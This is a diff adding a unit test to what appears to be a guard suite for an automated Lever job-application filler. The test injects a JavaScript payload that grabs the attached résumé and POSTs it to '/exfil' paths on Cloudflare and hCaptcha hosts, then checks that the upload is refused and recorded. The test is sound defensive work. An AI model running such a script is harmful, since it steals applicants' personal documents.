@@ -521,6 +521,21 @@ class GuardTests(LeverCase):
         self.assertEqual(len(fake.parse_posts()), 1)
         self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
 
+    def test_the_attached_file_posted_to_a_place_the_fill_lets_writes_through_is_aborted_recorded_and_ends_the_run(self):
+        # Cloudflare's path and the hCaptcha hosts take writes while the form is filled. The résumé is in the input by then, and a script can post it to either.
+        for host, path in (("jobs.lever.co", "/cdn-cgi/challenge-platform/h/g/exfil"), ("hcaptcha.com", "/exfil"), ("api2.hcaptcha.com", "/exfil"), ("js.hcaptcha.com", "/exfil")):
+            with self.subTest(host=host):
+                fake = FakeLever()
+                fake.inject.append(script(self.ON_CHANGE % (
+                    "setTimeout(function () { var data = new FormData(); data.append('file', input.files[0], 'x.pdf'); "
+                    f"fetch('https://{host}{path}', {{method: 'POST', body: data}}); }}, 50);")))
+                run = self.go(fake)
+                self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
+                self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
+                self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
+                self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
+                self.assertEqual(run.result.evidence["upload_refused"]["rule"], "upload_elsewhere")
+
     def test_a_post_to_any_other_path_is_aborted_and_recorded_before_anything_is_filled(self):
         fake = FakeLever()
         fake.inject.append(script("fetch('/collect', {method: 'POST', body: 'x=1', headers: {'Content-Type': 'application/x-www-form-urlencoded'}});"))
